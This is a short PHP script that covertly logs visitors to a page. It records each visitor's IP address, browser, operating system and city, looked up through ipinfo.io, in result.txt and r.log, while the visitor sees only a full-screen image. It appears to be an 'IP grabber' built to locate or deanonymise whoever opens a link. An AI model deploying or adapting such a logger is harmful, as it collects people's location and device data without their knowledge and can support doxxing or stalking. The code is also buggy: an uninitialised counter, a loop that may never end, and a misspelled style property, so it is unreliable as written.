<?php
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
if(filter_var($client, FILTER_VALIDATE_IP)) $ip = $client;
elseif(filter_var($forward, FILTER_VALIDATE_IP)) $ip = $forward;
else $ip = $remote;
$user_agent = $_SERVER["HTTP_USER_AGENT"];
  if (strpos($user_agent, "Firefox") !== false) $browser = "Firefox";
  elseif (strpos($user_agent, "Opera") !== false) $browser = "Opera";
  elseif (strpos($user_agent, "Chrome") !== false) $browser = "Chrome";
  elseif (strpos($user_agent, "MSIE") !== false) $browser = "Internet Explorer";
  elseif (strpos($user_agent, "Safari") !== false) $browser = "Safari";
  else $browser = "Неизвестный";
$newTitle = substr($user_agent, strpos($user_agent, '('));
while(true){
  if($newTitle[$i]==")"){
  $res = substr($newTitle, 1, $i=$i-1);
  break;
  }else{
      $i++;
  }
}
$url = file_get_contents("https://ipinfo.io/$ip/json");
$obj = json_decode($url,true);
$city = $obj['city'];
$all = "OS: $res \r IP: $ip \r Browser: $browser \r City: $city \r \r";
$f = fopen("result.txt", "w+");
fwrite($f, $all);
fclose($f);
$fs = fopen("r.log", "a+");
fwrite($fs, $all);
fclose($fs);
?>
<img src="finish.jpg" style="heigt:100%; width:100%;">
